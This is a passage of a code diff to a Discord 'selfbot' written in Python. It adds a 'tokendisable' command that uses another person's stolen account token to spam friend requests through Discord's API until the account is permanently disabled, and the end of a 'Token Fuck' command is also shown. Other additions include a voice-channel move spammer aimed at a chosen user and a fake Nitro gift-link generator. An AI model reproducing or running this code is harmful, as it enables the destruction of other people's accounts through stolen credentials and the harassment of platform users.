+                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                    try:
+                        await message.edit(embed=embed)  
+                    except:
+                        pass
+                                               
+
+
+            except asyncio.TimeoutError:
+                embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"You took too long - Run this command again if you wish to token fuck an account", color=randcolor)
+                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                await message.edit(embed=embed)
+                await message.clear_reactions()
+                reactionstuffyes= False
+
+
+
+@scalic.command(aliases=['disabletoken',"tokendisabler","deleteaccount","accountdelete"])
+async def tokendisable(ctx,tokentofrick=None):
+
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    await ctx.message.delete()
+    if tokentofrick == None:
+        embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"Supply a token - {prefix.strip()}tokendisable [token-here] ", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        await ctx.message.edit(content="",embed=embed)
+
+
+    elif ctx.guild == None:
+        embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"Try do this command in a private server - it has problems in dms (working on fixing)!", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        await ctx.message.edit(content="",embed=embed)
+
+    else:
+        embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"If your sure you want to disable that token, react.\nDisabling means that the account will be DISABLED - the chances of recovering it are pratically impossible.", color=randcolor)
+        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+        message = await ctx.send(embed=embed)        
+        await message.add_reaction('✅')
+        randcolor = random.randint(0x000000, 0xFFFFFF)
+        reactionstuffyes = True
+        def requirements(reaction, user):
+            return user == ctx.author and str(reaction.emoji) in ('✅') and message==message
+
+
+        while reactionstuffyes:
+            try:
+                reaction, user = await scalic.wait_for('reaction_remove', timeout=10, check=requirements)
+                embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"You reacted, the process has started!\nDisabling token", color=randcolor)
+                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                await message.edit(embed=embed)
+                await message.clear_reactions()
+                reactionstuffyes = False
+                headers={"authorization": tokentofrick} #using just the token as a header = ez disable with things like servers and friend requests
+
+                #this disabler works better then a payload saying theyre underage as its practically impossible to recover the acc
+
+                for i in range(50):
+                    requests.post("https://discord.com/api/v8/users/@me/relationships",headers=headers,json={"username":"01","discriminator":1}) #a random name thatll probably always be in demand + theyre probably used to people randomly friending them
+                    await asyncio.sleep(1) 
+                    requests.delete("https://discord.com/api/v8/users/@me/relationships/213583513780224000",headers=headers) #this way we can keep adding and removing them
+                    await asyncio.sleep(1) 
+                                              
+                                              
+                await asyncio.sleep(15) 
+                tokendata = requests.get("https://discord.com/api/v8/users/@me",headers=headers)
+                randcolor = random.randint(0x000000, 0xFFFFFF)
+                if tokendata.status_code != 200:
+                    embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"Token disabled - discord responds with : `{tokendata.text}`", color=randcolor)
+                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                    await message.edit(embed=embed)           
+                else:
+                    embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"Token valid - strange - try again maybe?", color=randcolor)
+                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                    await message.edit(embed=embed)      
+
+            except asyncio.TimeoutError:
+                embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"You took too long - Run this command again if you wish to DISABLE an account", color=randcolor)
+                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+                await message.edit(embed=embed)
+                await message.clear_reactions()
+                reactionstuffyes= False
+
+
 
 @scalic.command(aliases=["snipeedit"])
 async def editsnipe(ctx):
@@ -518,23 +1683,7 @@ async def embed(ctx,*,mesg=f"Format : {prefix.strip()}embed [words]"):
     await ctx.message.edit(content="",embed=embed)
 
 
-@scalic.command(aliases=['deletechans', 'deleteallchannels'])
-async def deletechannels(ctx):
-    await ctx.message.delete()
-    for chan in guild.channels:
-        try:
-            await chan.delete()
-        except:
-            pass
 
-@scalic.command(aliases=['deleterolls', 'deleteallroles'])
-async def deleteroles(ctx):
-    await ctx.message.delete()
-    for role in list(ctx.guild.roles):
-        try:
-            await role.delete()
-        except:
-            pass
 
 
 @scalic.command(aliases=['idunban', 'unbanid'])
@@ -670,6 +1819,23 @@ async def avatar(ctx, *,  memb : discord.Member=None):
     embed=discord.Embed(title=f"{memb.name}'s Avatar!", description=f"Link: {memb.avatar_url}", color=randcolor)
     embed.set_thumbnail(url=memb.avatar_url)
     await ctx.message.edit(content="",embed=embed)
+
+@scalic.command(aliases=['downloadav', 'downloadpfp'])
+async def downloadavatar(ctx, *,  memb : discord.Member=None):
+    if memb == None:  
+        memb = ctx.message.author 
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+
+       
+    response = requests.get(memb.avatar_url, stream=True)
+    with open(f"./data/{str(memb.id)}.png", 'wb') as pfp: 
+        shutil.copyfileobj(response.raw, pfp)
+
+    embed=discord.Embed(title=f"Downloaded {memb.name}'s Avatar!", description=f"Link: {memb.avatar_url}", color=randcolor)
+    embed.set_thumbnail(url=memb.avatar_url)
+    await ctx.message.edit(content="",embed=embed)
+
+
 
 
 @scalic.command(aliases=['emojibig', 'urlemoji', 'emojiurl'])
@@ -834,6 +2000,18 @@ async def logout(ctx):
     await ctx.message.edit(content="",embed=embed)
     await scalic.logout()
 
+#@scalic.command(aliases=['reboot'])
+#async def restart(ctx):
+#    randcolor = random.randint(0x000000, 0xFFFFFF)
+#    embed=discord.Embed(title="Scalic Selfbot - Restarting", description=f"Restarting!", color=randcolor)
+#    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+#    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+#    await ctx.message.edit(content="",embed=embed)
+#    await scalic.logout()
+#    scalic.run(token.strip(), bot=False)
+
+#This command needs working on - if any developers wanna help out lemme know, I just don't know how to 'restart' it
+
 @scalic.command(aliases=['purge'])
 async def clear(ctx, amount):
     deleted = 0
@@ -864,6 +2042,11 @@ async def clear(ctx, amount):
     embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
     embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
     await msg.edit(embed=embed,delete_after=3)
+
+@scalic.command(aliases=['nitrogen',"gennitro","nitrogenerator"])
+async def nitro(ctx):
+    code = "".join(random.choice(characters) for x in range(16))
+    await ctx.send(f"https://discord.gift/{code}")
 
 @scalic.command(aliases=['purgemessage',"purgecontent","clearmessage"])
 async def clearcontent(ctx, amount,*,messagetoclear):
@@ -1105,6 +2288,32 @@ async def privnotesnipe(ctx,snipestatus=None):
     embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
     embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
     await ctx.message.edit(content="",embed=embed)
+
+@scalic.command(aliases=['notificationson', 'notificationsoff',"notifs","notis","noti","alerts"])
+async def notifications(ctx,notifstatushm=None):
+    global notifsyems 
+    if snipestatus == None:
+        if notifsyems == "off":
+            notifsyems = "on"
+        elif notifsyems == "on":
+            notifsyems = "off"
+    else:
+        if notifstatushm.lower() == "off":
+            notifsyems = "off"
+        if notifstatushm.lower() == "on":
+            notifsyems = "on"
+
+        if notifstatushm.lower() == "true":
+            notifsyems = "on"
+        if notifstatushm.lower() == "false":
+            notifsyems = "off"
+
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title="Scalic Selfbot - Notifications", description=f"Notifications are now : `{notifsyems}`", color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+
 bumpstatus = "off"
 @scalic.command(aliases=['autobump', 'bumpauto'])
 async def bump(ctx,bumpingyuh=None):
@@ -1179,6 +2388,106 @@ async def giveawaysnipe(ctx,snipestatus=None):
     embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
     await ctx.message.edit(content="",embed=embed)
 
+@scalic.command(aliases=['friendbackup', 'serverbackup',"backupfriends","backupservers","backupfull","fullbackup"])
+async def backup(ctx,snipestatus=None):
+
+    friendssaved = 0
+    serverssaved = 0
+    groupssaved = 0
+    f = open(r'data/backup.txt','a')
+    f.write(f"\n\n- - - - -  F R I E N D - - - B A C K U P - - - - - \n\n")
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title="Scalic Selfbot - Backup", description=f"Backing up friends...", color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+    for frend in scalic.user.friends:
+        try:
+            f.write(f"{frend.name}#{frend.discriminator}|{frend.id}\n") 
+            friendssaved += 1
+        except: #Special characters = Exception -  UnicodeEncodeError: 'charmap' codec can't encode characters
+            f.write(f"Error writing friend name|{frend.id}\n")  #with their id its still possible to find people, so the backup is still useful!
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title="Scalic Selfbot - Backup", description=f"Saved `{friendssaved}` friends", color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+
+    f.write(f"\n\n- - - - -  S E R V E R - - - B A C K U P - - - - - \n\n")
+
+      #  try:
+      #      invitelink = await random.choice(guild.text_channels).create_invite(max_uses=1,unique=True)   -this was really strange - kept unverifying my account email. Discord had some problems earlier today where people got false "suspicious login emails" but this unverified, not forced a pw reset. Something to look into for making exploits but for now I'll do it off requests
+      #  except Exception as e:
+      #      invitelink = f"Error creating invite link + {e}"
+
+    payload = {
+    'max_age': '0',
+    'max_uses': '0',
+    'temporary': False
+    }
+    headers = { 'authorization': token.strip() }
+    for guild in scalic.guilds:
+        await asyncio.sleep(2)
+        try:
+            invchannel = random.choice(guild.text_channels)
+            inv = requests.post(f'https://discord.com/api/v6/channels/{invchannel.id}/invites', json = payload, headers = headers)
+
+            try:
+                invitecode = f"discord.gg/{str(inv.json()['code'])}"
+                serverssaved += 1
+            except:
+                invitecode = "Error making invite - probably has a vanity"
+
+
+            if invitecode == "50013": #seems to be an error from ratelimits
+                await asyncio.sleep(10)
+                invitecode = "Error making invite - seems to of been ratelimited"
+
+            
+            try:
+                f.write(f"{guild.name}|{guild.id}|{invitecode}\n")
+
+            except:
+                f.write(f"Error writing guild name|{guild.id}|{invitecode}\n") #Special characters = Exception -  UnicodeEncodeError: 'charmap' codec can't encode characters
+
+        except:
+            pass
+
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title="Scalic Selfbot - Backup", description=f"Saved `{friendssaved}` friends and `{serverssaved}` servers", color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+
+
+    f.write(f"\n\n- - - - -  G R O U P C H A T - - - B A C K U P - - - - - \n\n")
+    for cha in scalic.private_channels:
+        if isinstance(cha, discord.GroupChannel):
+            inv = requests.post(f'https://discord.com/api/v6/channels/{cha.id}/invites', json = {"max_age":86400}, headers = headers) #do daily backups if you plan on using the groups saved
+            try:
+                invitecode = f"discord.gg/{str(inv.json()['code'])}"
+            except:
+                invitecode = "Error making invite"
+            groupssaved += 1
+            try:
+                f.write(f"{cha.name}|{cha.id}|{invitecode}\n")
+            except:
+                f.write(f"Error writing guild name|{cha.id}|{invitecode}\n") #Special characters = Exception -  UnicodeEncodeError: 'charmap' codec can't encode characters
+
+
+
+
+
+    f.close()
+    randcolor = random.randint(0x000000, 0xFFFFFF)
+    embed=discord.Embed(title="Scalic Selfbot - Backup", description=f"Saved `{friendssaved}` friends , `{serverssaved}` servers and `{groupssaved}` group chats.", color=randcolor)
+    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
+    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
+    await ctx.message.edit(content="",embed=embed)
+
+    
+
+
 @scalic.command(aliases=['pastebinsniper', 'snipepastebins',"pastesnipe","snipepaste","snipepastebin"])
 async def pastebinsnipe(ctx,snipestatus=None):
     global pastebinsniping 
@@ -1219,7 +2528,7 @@ async def snipe(ctx):
 @scalic.command(aliases=['id', 'userid',"useridtoname"])
 async def idtoname(ctx, personsid: int):
     if len(str(personsid)) != 18:
-        await message.edit(content = f"**This command requires a user id - Turn on developers mode, get the id and run the command again! <:Sad:793595402842538045>**")    
+        await message.edit(content = f"**This command requires a user id - Turn on developers mode, get the id and run the command again!**")    
     else:
         user = await scalic.fetch_user(personsid)
         randcolor = random.randint(0x000000, 0xFFFFFF)
@@ -1228,6 +2537,44 @@ async def idtoname(ctx, personsid: int):
         embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
         await ctx.message.edit(content="",embed=embed)
 
+
+@scalic.command(aliases=['movevcspam', 'spammove',"vcspammer"])
+async def vcspam(ctx,channelone=None,channeltwo=None, personsid=None,amount=20):
+
+
+    if channelone==None or channeltwo==None:
+        await ctx.message.edit(content = f"**Try this command again but specify 2 server channel ids\n{prefix.strip()}vcspam [channelid1] [channelid2] [optional - userid] [optional - amount]**")  
+
+    else:
+        if personsid == None:
+            personsid = str(ctx.message.author.id)
+
+        elif len(str(personsid)) != 18:
+            await ctx.message.edit(content = f"**You didn't supply a valid user id so I'm using yours!**",delete_after=2)    
+            personsid = str(ctx.message.author.id)
+
+        try:
+            await ctx.message.delete()
+
+        except:
+            pass
+
+        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
+
+        for scalic in range(int(amount)):
+            requests.patch(f"https://discord.com/api/v8/guilds/{str(ctx.guild.id)}/members/{personsid}",headers=headers,json={"channel_id": channelone})
+            data = requests.patch(f"https://discord.com/api/v8/guilds/{str(ctx.guild.id)}/members/{personsid}",headers=headers,json={"channel_id": channeltwo}).text
+
+
+            if "rate limited" in data.lower(): 
+                try:
+                    j = json.loads(data)
+                    ratelimit = j['retry_after']
+                    timetowait = ratelimit / 1000
+                    await asyncio.sleep(timetowait)
+
+                except:
+                    await asyncio.sleep(5)
 
 
 @scalic.command(aliases=['asci','cooltext',])
@@ -1288,7 +2635,9 @@ async def on_message(ctx):
     global commandsdone
     global messagessent
     global talkingcuteyems
-
+    global isafk
+    global messagetosendwhenafk
+    global notifsyems
 
     if nitrosniping == "on":
         try:
@@ -1370,6 +2719,14 @@ async def on_message(ctx):
         except:
             pass
 
+    if notifsyems == "on":
+        if str(scalic.user.id) in str(ctx.content):
+            toast = ToastNotifier()
+            if ctx.guild != None:                                                                                       #i replace scalic user.id with name just so its clearer if the message pure content is pinging u and u dont know about ids and stuff
+                toast.show_toast(f"{scalic.user.name} - You got mentioned in {ctx.guild.name}",f"{ctx.channel.name} : {ctx.content.replace(str(scalic.user.id),scalic.user.name)}",duration=2,icon_path=f"./data/{str(scalic.user.id)}.ico")
+                #
+
+
     if ctx.author.id == scalic.user.id:
         messagessent += 1
         if ctx.content.startswith(prefix.strip()):
@@ -1418,7 +2775,13 @@ async def on_message(ctx):
 #                print(e)
                 pass
 
-
+    if ctx.guild == None:  
+        if isafk == "on":
+            if ctx.author.id != scalic.user.id:
+                try:
+                    await ctx.channel.send(messagetosendwhenafk)
+                except:
+                    pass
 
     await scalic.process_commands(ctx)
 
@@ -1519,7 +2882,7 @@ async def leave(ctx,servid=None):#
             embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
             await ctx.send(embed=embed)
     else:
-        headers = {'Authorization': thetoken, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
+        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
 
         embed=discord.Embed(title=f"Scalic Selfbot - Server Leaver", description=f"Leaving `{servid}`", color=randcolor)
         embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
